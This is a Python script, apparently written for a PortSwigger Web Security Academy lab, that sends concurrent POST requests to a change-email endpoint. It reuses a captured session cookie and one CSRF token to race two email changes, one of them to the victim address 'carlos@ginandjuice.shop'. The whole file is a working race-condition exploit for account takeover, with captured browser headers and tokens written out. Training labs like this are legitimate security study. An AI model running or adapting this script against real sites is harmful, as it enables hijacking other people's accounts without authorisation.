import aiohttp
import asyncio
import urllib.parse

async def send_post_request(session, url, form_data, headers, cookies):
    async with session.post(url, data=form_data, headers=headers, cookies=cookies) as response:
        return {
            'status': response.status,
            'text': await response.text(),
            'headers': dict(response.headers)
        }

async def main(form_data_list, url, headers, cookies):
    async with aiohttp.ClientSession() as session:
        tasks = [send_post_request(session, url, data, headers, cookies) for data in form_data_list]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        return responses

# Example usage
if __name__ == "__main__":
    url = "https://0a5600f80450515981700c08009400de.web-security-academy.net/my-account/change-email"
    
    # Headers from the provided request
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://0a5600f80450515981700c08009400de.web-security-academy.net",
        "Referer": "https://0a5600f80450515981700c08009400de.web-security-academy.net/my-account",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i",
        "Te": "trailers"
    }

    # Cookies from the provided request
    cookies = {
        "session": "KGfod9ctM6KAJYPunqNht6rrfLMhjrcd"
    }

    # List of form data payloads for POST requests
    # Example: multiple email addresses with the same CSRF token
    form_data_list = [
        urllib.parse.urlencode({
            "email": "carlos@ginandjuice.shop",
            "csrf": "sJaSLxDBSeh04TFYhUFyvUgKux9i6KN3"
        }),
        urllib.parse.urlencode({
            "email": "test@exploit-0ac20017049b511181530b39017e00b7.exploit-server.net",
            "csrf": "sJaSLxDBSeh04TFYhUFyvUgKux9i6KN3"
        }),
        
    ]

    # Run the async main function
    responses = asyncio.run(main(form_data_list, url,headers, cookies))

    # Process responses
    for i, response in enumerate(responses):
        if isinstance(response, Exception):
            print(f"Request {i+1} failed: {response}")
        else:
            print(f"Request {i+1} response:")
            print(f"  Status: {response['status']}")
            print(f"  Body: {response['text'][:200]}...")  # Truncate for brevity
            print(f"  Headers: {response['headers']}")
